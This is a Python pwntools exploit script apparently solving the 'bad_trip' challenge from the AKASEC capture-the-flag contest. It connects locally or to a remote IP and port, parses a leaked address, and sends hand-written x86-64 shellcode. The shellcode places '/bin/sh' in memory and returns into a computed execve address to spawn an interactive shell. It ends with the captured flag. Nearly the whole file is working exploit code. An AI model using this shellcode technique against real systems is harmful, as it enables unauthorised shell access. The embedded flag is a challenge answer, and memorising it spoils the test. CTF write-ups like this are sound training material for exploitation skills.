#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./bad_trip')
context.terminal = ['tmux', 'splitw', '-h']

def start():
    if args.GDB:
        return gdb.debug('./bad_trip', gdbscript=gs)
    if args.REMOTE:
        return remote('172.210.129.230', 1352)
    else:
        return process('./bad_trip')
r = start()

def format_byte_string(byte_string):
    result = 'b"' + ''.join(f'\\x{b:02x}' for b in byte_string) + '"'
    print(result)

#========= exploit here ===================

r.recvuntil(b"with ")
leak = int(r.recvline().strip(),16)

log.info(f"leak {hex(leak)}")

payload = b"\x90"*0x7
payload += b"\x90"

#execve() - puts()
#0x617e0 #0x6a220 #0x60e00
payload += asm(f'''
    mov rsp, 0x6969696000
    mov rbp, 0x6969696000
    mov r11, 0x0068732f6e69622f
    mov rdi, 0x6969696500
    mov [rdi], r11
    xor rsi, rsi
    xor rdx, rdx
    mov r10, fs:0x0
    mov eax, {hex(leak+0x60e00)}
    mov r11, 0xFFFFFFFF00000000
    and r10, r11
    or r10, rax
    mov [rsp], r10
    ret
''')

payload += b"\x90"*0x20
#print to screen for debugging in docker
format_byte_string(payload)

r.sendlineafter(b">>", payload)
r.timeout = 1

#========= interactive ====================
r.interactive()
#AKASEC{pr3f37CH3M_Li8C_4Ddr35532}